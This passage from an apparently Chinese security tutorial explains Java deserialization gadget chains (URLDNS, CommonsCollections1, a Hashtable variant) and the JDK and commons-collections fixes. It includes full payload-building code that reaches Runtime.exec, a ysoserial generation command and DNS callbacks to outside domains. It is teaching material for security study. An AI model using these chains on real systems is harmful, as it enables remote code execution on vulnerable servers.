成员的序列化规则』\n"},"articles/security/java/roadmap/Java-安全---反序列化利用链":{"title":"Java 安全 - 反序列化利用链","links":["articles/security/java/roadmap/Java-安全---反序列化","articles/security/java/roadmap/Java-安全---动态代理","articles/security/java/roadmap/Java-安全---反射"],"tags":["java","serialization"],"content":"简单介绍完 Java 的 反序列化机制，下面来看看反序列化漏洞，也就是 Java 反序列化机制的安全问题。\n想要利用反序列化漏洞，就需要 Gadget Chain（可以简称 Gadget 或利用链），所谓 Gadget 可以理解成一系列的方法调用，连接起漏洞的触发点（如：readObject）和最后执行命令的地方（如：Runtime.exec）。如果了解过二进制漏洞或其它语言的反序列化漏洞，想必对它不会陌生。\n从 2015 年 Gabriel Lawrence (@gebl) 和 Chris Frohoff (@frohoff) 在 AppSecCali 反序列化漏洞被公布，并随之诞生的第一个里程碑式的工具，ysoserial 是很多人学习 Java 反序列化漏洞的起点。\n这个工具包含了很多开箱即用的 Gadget，使用方式很简单，使用下面的命令即可生成一个恶意的序列化数据，在反序列化时会执行 id 命令，这条命令使用的 Gadget 是 CommonsCollections1：\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;\nURLDNS\n记得刚学习反序列化那会，在网上随便一搜看到最多的就是 CommonsCollectionsX 的身影。看的是那叫一个头疼，CommonsCollections 系列的利用链虽然知名度高，但对新手不友好。所以这里先从 URLDNS 开始介绍\n通常利用链的目的都是为了达到命令执行，这更具有实战意义。但如果只是考虑验证反序列化漏洞则只要确认反序列化被触发了即可。URLDNS 的思路也是如此，通过发起 DNS 外连请求来检测是否触发。这个思路最早应该来自于参考 1。\n那么如何才能在反序列化时发起 DNS 请求呢？\njava.net.URL\nURL 是 JDK 原生自带的类，在它的 equals 方法的注释中有这样一段描述『主要看前半句和后半句』，如果两个主机名解析后的 IP 是相同的，则认为它们相同，并且有说明 equals 方法会对主机名进行解析，为阻塞操作。\n\nTwo hosts are considered equivalent if both host names can be resolved into the same IP addresses; else if either host name can’t be resolved, the host names must be equal without regard to case; or both host names equal to null. Since hosts comparison requires name resolution, this operation is a blocking operation.\n\n而 hashCode 方法内也会触发域名解析，所以在反序列化时想办法调用 equals 或 hashCode 方法就能做到发起 DNS 请求。\n两种方法触发 DNS 解析的调用栈如下\n// by equals\ngetHostAddress:755, URL (java.net)\ngetHostAddress:434, URLStreamHandler (java.net)\nhostsEqual:446, URLStreamHandler (java.net)\nsameFile:418, URLStreamHandler (java.net)\nequals:339, URLStreamHandler (java.net)\nequals:913, URL (java.net)\n\n// by hashCode\ngetHostAddress:755, URL (java.net)\ngetHostAddress:434, URLStreamHandler (java.net)\nhashCode:359, URLStreamHandler (java.net)\nhashCode:928, URL (java.net)\n\nHashMap\n想触发 hashCode 方法，最容易想到的就是 HashMap，它在反序列化时会读取所有的元素并调用 putVal 存入，同时计算它们的 hash 值\n下面是整个利用链的触发过程\nGadget Chain:\n  HashMap.readObject()\n    HashMap.putVal()\n      HashMap.hash()\n        URL.hashCode()\n\n尝试构造利用链\npublic static void main(String[] args) throws MalformedURLException {\n\tURL url = new URL(&quot;efarxjuiph.dnstunnel.run&quot;);\n \n\tHashMap&lt;URL, String&gt; map = new HashMap&lt;&gt;();\n\tmap.put(url, &quot;1&quot;);\n \n\ttry (ObjectOutputStream oos =\n\t\t\tnew ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;target/urldns.bin&quot;)))) {\n\t\toos.writeObject(map);\n\t} catch (IOException e) {\n\t\te.printStackTrace();\n\t}\n \n\ttry (ObjectInputStream ois =\n\t\t\t new ObjectInputStream(Files.newInputStream(Paths.get(&quot;target/urldns.bin&quot;)))) {\n\t\tois.readObject();\n\t} catch (IOException | ClassNotFoundException e) {\n\t\te.printStackTrace();\n\t}\n}\n但这里有一些问题，在序列化的时候就触发了 DNS 请求，这是因为 put 方法也会计算 hash 值从而调用了 hashCode。\n\n另一个问题，反序列化时并没有触发 DNS 请求『URL#getHostAddress 并没有触发』。\n先解决反序列化时的问题，首先需要知道的是在序列化时 URL 的成员 hashCode 也会被写入『@serial 已经说明了』\n/* Our hash code.\n * @serial\n */\nprivate int hashCode = -1;\n序列化时调用了 hashCode 方法，它会对成员 hashCode 赋值\npublic synchronized int hashCode() {\n\tif (hashCode != -1)\n\t\treturn hashCode;\n \n\thashCode = handler.hashCode(this);\n\treturn hashCode;\n}\n修改方式也很简单，通过反射修改 hashCode 字段值即可\nReflections.setFieldValue(url, &quot;hashCode&quot;, -1);\n\nMac 下可通过 dscacheutil-flushcache 清楚 DNS 缓存。\n\n接下来为了避免序列化时触发 DNS 请求，也就要避免在 hashCode 中发起 DNS 请求，从 URL 中的实现可以看到会调用 handler.hashCode(this) 计算结果。\n而 handler 的类型是 URLStreamHandler，开发者可以继承这个抽象类并自定义 handler 的行为。可以重写 hashCode 方法，下面实现一个 SilenceURLStreamHandler，它的 hashCode 方法直接返回 -1 不进行其它操作。\nprivate static class SilenceURLStreamHandler extends URLStreamHandler {\n \n\t@Override\n\tprotected URLConnection openConnection(URL u) throws IOException {\n\t\treturn null;\n\t}\n \n\t@Override\n\tpublic int hashCode(URL u) {\n\t\treturn -1;\n\t}\n}\n完整的构造代码\npublic class URLDNS {\n \n    private static class SilenceURLStreamHandler extends URLStreamHandler {\n \n        @Override\n        protected URLConnection openConnection(URL u) throws IOException {\n            return null;\n        }\n \n        @Override\n        public int hashCode(URL u) {\n            return -1;\n        }\n    }\n \n    public static void main(String[] args) throws Exception {\n        URL url = new URL(null, &quot;tribfayzgp.dnstunnel.run&quot;, new SilenceURLStreamHandler());\n \n        HashMap&lt;URL, String&gt; map = new HashMap&lt;&gt;();\n        map.put(url, &quot;1&quot;);\n \n        Reflections.setFieldValue(url, &quot;hashCode&quot;, -1);\n \n        ObjectOutputStream oos =\n                new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;target/urldns.bin&quot;)));\n        oos.writeObject(map);\n \n        ObjectInputStream ois =\n                new ObjectInputStream(Files.newInputStream(Paths.get(&quot;target/urldns.bin&quot;)));\n        ois.readObject();\n    }\n}\nCommonsCollections\n\n当我第一次学习它的时候，有许多不理解，但并未深究。为此给之后带来了些许问题，利用链的学习很容易陷入跟着调用栈走一遍的尴尬，而没有实质性的收获。\n\nCommonsCollections 利用链最早的形式是 CommonsCollections1，位于 ysoserial 工具中，由 frohoff 在 OWASP AppSecCali 2015 上发布。这条利用链主要借助 commons-collections 库实现命令执行。\n当然它能讲的东西还很多，CommonsCollections1 的整体结构略复杂，从学习的角度看把它拆开逐步来看会更合适。\n\n可从 github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java 查看利用链调用栈。\n\nLazyMap 利用链\nLazyMap 是 CommonsCollections1 中承上启下的一部分，化繁为简，先来看下面这段代码。\nLazyMapExec.java\nChainedTransformer chainedTransformer =\n\tnew ChainedTransformer(\n\t\tnew Transformer[] {\n\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\tnew InvokerTransformer(\n\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\tnew InvokerTransformer(\n\t\t\t\t&quot;invoke&quot;,\n\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\tnew InvokerTransformer(\n\t\t\t\t&quot;exec&quot;,\n\t\t\t\tnew Class[] {String.class},\n\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t});\n \nLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);\n \nlazyMap.get(&quot;key&quot;);\n运行一下应该就能看到计算机弹窗了\n\n即便对 CommonsCollections1 不了解，如果理解 Java 反射，大概也能猜到 chainedTransformer 是在做什么；它的作用等价于执行 Runtime.getRuntime().exec(&quot;open-a calculator&quot;)。\n那触发 chainedTransformer 执行的自然就是主角之一的 LazyMap，在 LazyMap 的注释中有写道\n\nDecorates another Map to create objects in the map on demand. When the get(Object) method is called with a key that does not exist in the map, the factory is used to create the object. The created object will be added to the map using the requested key.\n\nLazyMap 借助底层的 Map 来存储创建的对象，如果在调用 get 方法时，对应的 key 不存在，那么就会使用成员 factory 创建这个 key 对应的对象并添加进 map 中。\n这里的 factory 类型是 Transformer，在本例为 ChainedTransformer。\nTransformer\n在介绍 ChainedTransformer、ConstantTransformer、InvokerTransformer 前先来了解 Transformer 接口，因为前者都是它的实现类。接口中只声明了一个方法，作用是将输入对象转换为另一个输出对象\npublic interface Transformer {\n    public Object transform(Object input);\n}\n而 ChainedTransformer、ConstantTransformer、InvokerTransformer 对它的实现逻辑则是\n\nConstantTransformer：直接返回输入对象\nInvokerTransformer：调用输入对象的指定方法\nChainedTransformer：将 Transformer 的输出作为下一个 Transformer 的输入，串连起来\n\n那么现在需要能够触发 Transformer 的地方，利用链中用到了 LazyMap，前面已经提到如果在调用 get 方法时，对应的 key 不存在，那么就会使用成员 factory(Transformer) 创建这个 key 对应的对象并添加进 map 中。\n所以在 LazyMapExec 中 lazyMap.get(&quot;key&quot;); 触发了 chainedTransformer 的执行。调用栈非常简单，只有 2 层。\ntransform:121, ChainedTransformer (org.apache.commons.collections.functors)\nget:151, LazyMap (org.apache.commons.collections.map)\nmain:33, LazyMapExec (com.trganda.gadget.commonscollection)\n\nAnnotationInvocationHandler\n但是 LazyMap#readObject 方法中并不会调用 get 方法，为此需要找一个类，它在反序列化时能够调用 LazyMap#get 方法。满足这一点通常说明它内部有成员的类型是与 LazyMap 兼容的。\n而 sun.reflect.annotation.AnnotationInvocationHandler 正好满足\nAnnotationInvocationHandler 有两个主要成员，其中 memberValues 类型为 Map&lt;String, Object&gt;，\nprivate final Class&lt;? extends Annotation&gt; type;\nprivate final Map&lt;String, Object&gt; memberValues;\n\n先瞅一眼它的 readObject 方法，\nprivate void readObject(java.io.ObjectInputStream s)\n\tthrows java.io.IOException, ClassNotFoundException {\n\ts.defaultReadObject();\n \n\t// Check to make sure that types have not evolved incompatibly\n \n\tAnnotationType annotationType = null;\n\ttry {\n\t\tannotationType = AnnotationType.getInstance(type);\n\t} catch(IllegalArgumentException e) {\n\t\t// Class is no longer an annotation type; time to punch out\n\t\tthrow new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);\n\t}\n \n\tMap&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();\n \n\t// If there are annotation members without values, that\n\t// situation is handled by the invoke method.\n\tfor (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {\n\t\tString name = memberValue.getKey();\n\t\tClass&lt;?&gt; memberType = memberTypes.get(name); // [1] 调用 get 方法\n\t\tif (memberType != null) {  // i.e. member still exists\n\t\t\tObject value = memberValue.getValue();\n\t\t\tif (!(memberType.isInstance(value) ||\n\t\t\t\t  value instanceof ExceptionProxy)) {\n\t\t\t\tmemberValue.setValue(\n\t\t\t\t\tnew AnnotationTypeMismatchExceptionProxy(\n\t\t\t\t\t\tvalue.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(\n\t\t\t\t\t\t\tannotationType.members().get(name)));\n\t\t\t}\n\t\t}\n\t}\n}\n但是并没有看到直接调用 memberValues(假设为 LazyMap).get 方法的地方，倒是在 [1] 看到了 memberTypes.get(name)，要怎么样才能调用 LazyMap#get 方法呢？为了实现这一点，需要转个弯『这个弯并不太好理解』。\n首先虽然没有直接调用 memberValues.get，但是有调用 memberValues.entrySet()，而 AnnotationInvocationHandler 自身实现了 InvocationHandler 接口可以用作创建代理对象，有关动态代理的内容，可见 Java 安全 - 动态代理。\n如果让 AnnotationInvocationHandler 代理 Map 接口，那么在调用 entrySet 方法时触发 invoke 方法，在 invoke 中再调用 memberValues.get。而在 [2] 中，确实有调用 memberValues.get 方法的地方。\npublic Object invoke(Object proxy, Method method, Object[] args) {\n\tString member = method.getName();\n\tClass&lt;?&gt;[] paramTypes = method.getParameterTypes();\n \n\t// Handle Object and Annotation methods\n\tif (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;\n\t\tparamTypes[0] == Object.class)\n\t\treturn equalsImpl(args[0]);\n\tif (paramTypes.length != 0)\n\t\tthrow new AssertionError(&quot;Too many parameters for an annotation method&quot;);\n \n\tswitch(member) {\n\tcase &quot;toString&quot;:\n\t\treturn toStringImpl();\n\tcase &quot;hashCode&quot;:\n\t\treturn hashCodeImpl();\n\tcase &quot;annotationType&quot;:\n\t\treturn type;\n\t}\n \n\t// Handle annotation member accessors\n\tObject result = memberValues.get(member); // [2] 调用 `memberValues.get` 触发 chainedTransformer。\n \n\tif (result == null)\n\t\tthrow new IncompleteAnnotationException(type, member);\n \n\tif (result instanceof ExceptionProxy)\n\t\tthrow ((ExceptionProxy) result).generateException();\n \n\tif (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)\n\t\tresult = cloneArray(result);\n \n\treturn result;\n}\nLazyMapAnnotationExec.java\n按照这个思路修改代码，构造利用链\npublic static Object getObject() throws Exception {\n\tChainedTransformer chainedTransformer =\n\t\t\tnew ChainedTransformer(\n\t\t\t\t\tnew Transformer[] {\n\t\t\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t\t\t});\n \n\tLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap&lt;&gt;(), chainedTransformer);\n \n\tInvocationHandler handler =\n\t\t\t(InvocationHandler)\n\t\t\t\t\tReflections.getFirstCtor(\n\t\t\t\t\t\t\t\t\t&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)\n\t\t\t\t\t\t\t.newInstance(Override.class, lazyMap);\n    // 代理 Map 接口\n\tMap map =\n\t\t\t(Map)\n\t\t\t\t\tProxy.newProxyInstance(\n\t\t\t\t\t\t\tClassLoader.getSystemClassLoader(),\n\t\t\t\t\t\t\tnew Class[] {Map.class},\n\t\t\t\t\t\t\thandler);\n\t// 需要再次进行创建一个 `AnnotationInvocationHandler`，因为 `Proxy` 类虽然实现了 Serializable 接口但是没有实现 `readObject` 方法，反序列化时不会有其它操作。\n\tInvocationHandler anotherHandler =\n\t\t(InvocationHandler) Reflections.getFirstCtor(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)\n\t\t\t\t.newInstance(Override.class, map);\n \n\treturn anotherHandler;\n}\n将 getObject 的返回结果序列化『可以检查一下序列化时命令是否被执行』，再反序列化，应该能看到计算器被打开了。\n\n但这里遗留着一点问题，为什么构造 AnnotationInvocationHandler 时需要使用 Overload.class？以及，为什么要对创建的代理对象 map 再次进行封装。\n对于第一个问题，因为在 AnnotationInvocationHandler 的构造方法里，会检查参数类型是否为一个 Annotation，所以使用了 Overload.class，当然也可以使用其它注解类型。\nAnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) {\n\tClass&lt;?&gt;[] superInterfaces = type.getInterfaces();\n\tif (!type.isAnnotation() ||\n\t\tsuperInterfaces.length != 1 ||\n\t\tsuperInterfaces[0] != java.lang.annotation.Annotation.class)\n\t\tthrow new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);\n\tthis.type = type;\n\tthis.memberValues = memberValues;\n}\n对于第二个问题，其实很简单，首先反序列化的起点是 AnnotationInvocationHandler，如果直接返回 map 对象算怎么回事。其次 map 对象本质是一个代理对象，它并没有自己实现 readObject 方法，反序列化时没有默认行为外的操作，无法进行利用，也不会进一步触发利用链。\n序列化时触发了命令执行\n如果你以非 Debug 模式运行前面的代码，在序列化时大概率是不会触发命令执行的。可如果切换至 Debug 模式执行，大概会看到不该出现的计算机弹窗。\n\n没能找出上述现象产生的原因，在序列化时，尝试在 ChainedTransformer#transformer 打断点，但并没有用。\n\n解决办法也很简单，先用一个无害的 ChainedTransformer，在构造完毕后通过反射，将 LazyMap 的成员 factory 替换为用于命令执行的 ChainedTransformer。\nChainedTransformer fakeTransformer =\n\t\t\tnew ChainedTransformer(new Transformer[] {new ConstantTransformer(&quot;1&quot;)});\n \n// ...\nInvocationHandler anotherHandler =\n\t\t(InvocationHandler)\n\t\t\t\tReflections.getFirstCtor(\n\t\t\t\t\t\t\t\t&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)\n\t\t\t\t\t\t.newInstance(Override.class, map);\nReflections.setFieldValue(lazyMap, &quot;factory&quot;, chainedTransformer);\n简化版调用关系梳理\n下面梳理一下利用链在反序列化时的调用过程\nObjectInputStream.readObject\n  // 调用 AnnotationInvocationHandler 的 readObject 方法，第一次\n  AnnotationInvocationHandler.readObject\n    // 调用 readObject，第二次\n    AnnotationInvocationHandler.readObject\n      // 恢复成员的内容，此时的 memberValues 为 lazyMap\n      s.defaultReadObject()\n \n      // 第一次调用 entrySet（size 为 0），此时是直接调用 LazyMap#entrySet，没有调用 get 方法，不会触发命令执行。\n      memberValues.entrySet\n \n    // 返回第一层 readObject，再次调用了 entrySet 方法，但实际调用的是 $Proxy#entrySet，即代理对象的entrySet方法\n    memberValues.entrySet\n      $Proxy0(LazyMap).entrySet\n         // 触发代理类 handler(AnnotationInvocationHandler) 的 invoke 方法\n         super.h.invoke(this, m14, null);\n           // 调用 LazyMap#get 方法，触发后续链条执行命令\n\t       memberValues(LazyMap).get\n\t\t     ChainedTransformer.transform\n\t\t\t ConstantTransformer.transform\n\t\t\t InvokerTransformer.transform\n\t\t\t   Runtime.exec\n8u71 为什么失败\n前面的用例测试环境为 8u66，可如果在 8u71 上运行并不会弹窗，并且会出现如下异常信息，主要内容为 java.lang.Override missing element entrySet\nException in thread &quot;main&quot; java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet\n\tat sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:81)\n\tat com.sun.proxy.$Proxy0.entrySet(Unknown Source)\n\n在 IDE 中查看 AnnotationInvocationHandler，会发现代码有较大变化，最凸显的内容，就是多了个私有类 UnsafeAccessor，且 readObject 方法的实现也发生了改变\n\n具体的差异，可以在 github.com/openjdk/jdk8u-dev/commit/44ad83395ee267fdd564d4d37bd43594f3f48a46 查看，commit 中描述的内容为 Cleanup for handling proxies。\n\n从 commit 的描述看能了解到此次修改的目的是让 AnnotationInvocationHandler 不再具备操作其它代理类的能力。\n\n分析一下修改的内容，首先成员的反序列化不再通过 defaultReadObject，而是 s.readFields()，此方法也会触发成员的反序列化，但这不是需要重点。\n调用此方法获取成员内容后，并不会直接赋值给 this 对象，而是交给本地变量 streamVals，这意味着成员 memberValues 此刻为 null。\n而 memberValues 的赋值位于 UnsafeAccessor.setMemberValues(this, mv);，而 mv 的类型是固定的，为 LinkedHashMap，而非 LazyMap，这意味着此利用链无法被使用，因为成员 memberValues 已经不可控了。\n梳理一下调用链\nObjectInputStream.readObject\n  // 调用 AnnotationInvocationHandler 的 readObject 方法，第一次\n  AnnotationInvocationHandler.readObject\n    // 调用 readObject，第二次\n    AnnotationInvocationHandler.readObject\n      // 读取成员的内容，此时的 this.memberValues 为 null\n      s.readFields();\n      // 将读取的 memberValues（序列化流中的内容，非 this） 赋值给本地变量 streamVals\n      Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);\n \n      // 创建临时变量 mv\n      Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();\n \n      // 第一次调用 entrySet（size 为 0），此时是直接调用 LazyMap#entrySet，没有调用 get 方法，不会触发命令执行。\n      streamVals.entrySet\n \n      // 将 mv 赋值给 this.memberValues，类型为 LinkedHashMap\n      UnsafeAccessor.setMemberValues(this, mv);\n \n    // 返回第一层 readObject，再次调用了 entrySet 方法，但实际调用的是 $Proxy#entrySet，即代理对象的 entrySet 方法\n    memberValues.entrySet\n      $Proxy0(LinkedHashMap).entrySet\n         // 触发代理类 handler(AnnotationInvocationHandler) 的 invoke 方法\n         super.h.invoke(this, m14, null);\n           // 调用 LinkedHashMap#get 方法，此时 this.memberValues 的类型早已不是 LazyMap，不会触发命令执行，因为 this.memberValues 的大小是 0，get获取的内容为 null，从而引发 IncompleteAnnotationException 异常。\n\t       memberValues(LinkedHashMap).get\nCommons Collections 的修复与变化\nCommonsCollections1 依赖 commons-collections:3.x，如果在 commons-collections4:4.x 中使用呢？\n先试试 commons-collections4:4.0，记得将导入的包名进行替换\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\nimport org.apache.commons.collections4.map.LazyMap;\n并将\nLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap&lt;&gt;(), chainedTransformer);\n替换为\nLazyMap lazyMap = (LazyMap) LazyMap.lazyMap(new HashMap&lt;&gt;(), fakeTransformer);\n测试可以看到，依旧正常弹窗，但是若将版本切换至 4.1，则会失败，异常信息如下\nException in thread &quot;main&quot; java.io.NotSerializableException: org.apache.commons.collections4.functors.InvokerTransformer\n\n意思很明白，InvokerTransformer 不允许被序列化了，修复方式可谓非常简单粗暴。\n再来看看 3.x 版本的变化，3.x 的最后一个版本为 3.2.2，发布于 2015 年。在此版本下测试前面的利用链也会失败，异常信息如下\nException in thread &quot;main&quot; java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property &#039;org.apache.commons.collections.enableUnsafeSerialization&#039; to &#039;true&#039;, but you must ensure that your application does not de-serialize objects from untrusted sources.\n\tat org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)\n\n从 InvokerTransformer 文件的注释中可以看到，如果尝试序列化会触发异常 UnsupportedOperationException\n\nWARNING: from v3.2.2 onwards this class will throw an UnsupportedOperationException when trying to serialize or de-serialize an instance to prevent potential remote code execution exploits.\n\n所以可以得出的一个大致结论是，CC1 在以下条件中有效：\n\nJDK/JRE &lt; 8u71\ncommons-collections &lt; 3.2.2 或 commons-collections4 4.0\n\nLazyMapHashMapExec.java\n前面提到 AnnotationInvocationHandler 在高版本 JDK 中已经修复，无法作为利用链的一部分继续使用。所以需要一个替代品，能够在反序列化时调用到 LazyMap#get 方法。\n下面介绍另一个主角，HashMap#equals 方法，或者说 AbstractMap#equals 方法，因为 HashMap 继承自 AbstractMap 。\n\nAbstractMap 是 Map 类型的骨架类，实现了 Map 接口的一些基础方法。\n\n此方法的代码片段如下，[3] 能看到对 Map#get 方法对调用，\npublic boolean equals(Object o) {\n\tif (o == this)\n\t\treturn true;\n \n\tif (!(o instanceof Map))\n\t\treturn false;\n\tMap&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; // 转换参数 o\n\tif (m.size() != size())\n\t\treturn false;\n \n\ttry {\n\t\tIterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();\n\t\twhile (i.hasNext()) {\n\t\t\tEntry&lt;K,V&gt; e = i.next();\n\t\t\tK key = e.getKey();\n\t\t\tV value = e.getValue();\n\t\t\tif (value == null) {\n\t\t\t\tif (!(m.get(key)==null &amp;&amp; m.containsKey(key)))\n\t\t\t\t\treturn false;\n\t\t\t} else {\n\t\t\t\tif (!value.equals(m.get(key))) // [3] 调用 m.get，也就是o.get\n\t\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t\t// ...\n观察 AbstractMap#equals 方法，想要调用 get 方法，需要保证 entrySet 不为空，也就是 map 的内容不能为空（无论 key 还是 value）。\n下面来看一段示例代码，说明如何利用这一点\npublic static void main(String[] args) {\n\tConstantTransformer fake = new ConstantTransformer(&quot;fake&quot;);\n\tChainedTransformer chainedTransformer =\n\t\t\tnew ChainedTransformer(\n\t\t\t\t\tnew Transformer[] {\n\t\t\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t\t\t});\n \n\tLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), fake);\n\tlazyMap.put(&quot;k1&quot;, &quot;v1&quot;);\n    // payload 放置在 lazyMap2，也就是 equals 方法的参数中\n\tLazyMap lazyMap2 = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);\n\tlazyMap2.put(&quot;k2&quot;, &quot;v2&quot;);\n \n\tSystem.out.println(lazyMap.equals(lazyMap2));\n}\n由于 LazyMap 内部的 map 成员为 HashMap，当调用 LazyMap#equals 方法时，实际调用的是 HashMap#equals 方法，即 AbstractMap#equals 方法，这里并不难理解。\n而如果想构造真正的利用链，还差了最后一步 Hashtable#readObject。Hashtable#readObject 中能够触发至 Map#equals 方法，\nprivate void readObject(java.io.ObjectInputStream s)\n\t throws IOException, ClassNotFoundException\n{\n\t// Read in the length, threshold, and loadfactor\n\ts.defaultReadObject();\n \n\t// ...\n\t// Read the number of elements and then all the key/value objects\n\tfor (; elements &gt; 0; elements--) {\n\t\t@SuppressWarnings(&quot;unchecked&quot;)\n\t\t\tK key = (K)s.readObject();\n\t\t@SuppressWarnings(&quot;unchecked&quot;)\n\t\t\tV value = (V)s.readObject();\n\t\t// synch could be eliminated for performance\n\t\treconstitutionPut(table, key, value);\n\t}\n}\n \nprivate void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)\n\tthrows StreamCorruptedException\n{\n\tif (value == null) {\n\t\tthrow new java.io.StreamCorruptedException();\n\t}\n\t// Makes sure the key is not already in the hashtable.\n\t// This should not happen in deserialized version.\n\tint hash = key.hashCode();\n\tint index = (hash &amp; 0x7FFFFFFF) % tab.length;\n\tfor (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {\n\t\tif ((e.hash == hash) &amp;&amp; e.key.equals(key)) {\n\t\t\tthrow new java.io.StreamCorruptedException();\n\t\t}\n\t}\n \n\t// ...\n}\n调用点实际存在于 Hashtable#reconstitutionPut。\n哈希碰撞\n按照前面的思路，编写以下代码\npublic static Object getObject() throws Exception {\n \n\tConstantTransformer fake = new ConstantTransformer(&quot;fake&quot;);\n\tChainedTransformer chainedTransformer =\n\t\t\tnew ChainedTransformer(\n\t\t\t\t\tnew Transformer[] {\n\t\t\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;getMethod&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class, Class[].class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;getRuntime&quot;, new Class[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;invoke&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {Object.class, Object[].class},\n\t\t\t\t\t\t\t\tnew Object[] {null, new Object[0]}),\n\t\t\t\t\t\tnew InvokerTransformer(\n\t\t\t\t\t\t\t\t&quot;exec&quot;,\n\t\t\t\t\t\t\t\tnew Class[] {String.class},\n\t\t\t\t\t\t\t\tnew Object[] {&quot;open -a calculator&quot;})\n\t\t\t\t\t});\n \n\tLazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), fake);\n\tlazyMap.put(&quot;k1&quot;, &quot;v1&quot;);\n \n\tLazyMap lazyMap2 = (LazyMap) LazyMap.decorate(new HashMap(), fake);\n\tlazyMap2.put(&quot;k2&quot;, &quot;v2&quot;);\n \n\tHashtable hashtable = new Hashtable();\n\thashtable.put(lazyMap, &quot;1&quot;);\n\thashtable.put(lazyMap2, &quot;2&quot;);\n \n\tReflections.setFieldValue(lazyMap2, &quot;factory&quot;, chainedTransformer);\n \n\treturn hashtable;\n}\n但是并没有弹窗，原因还得在 Hashtable#reconstitutionPut 中寻找，\nprivate void reconstitutionPut(Entry&lt;?,?&gt;[] tab, K key, V value)\n\tthrows StreamCorruptedException\n{\n\tif (value == null) {\n\t\tthrow new java.io.StreamCorruptedException();\n\t}\n\t// Makes sure the key is not already in the hashtable.\n\t// This should not happen in deserialized version.\n\tint hash = key.hashCode();\n\tint index = (hash &amp; 0x7FFFFFFF) % tab.length;\n\tfor (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) {\n\t\tif ((e.hash == hash) &amp;&amp; e.key.equals(key)) {\n\t\t\tthrow new java.io.StreamCorruptedException();\n\t\t}\n\t}\n\t// Creates the new 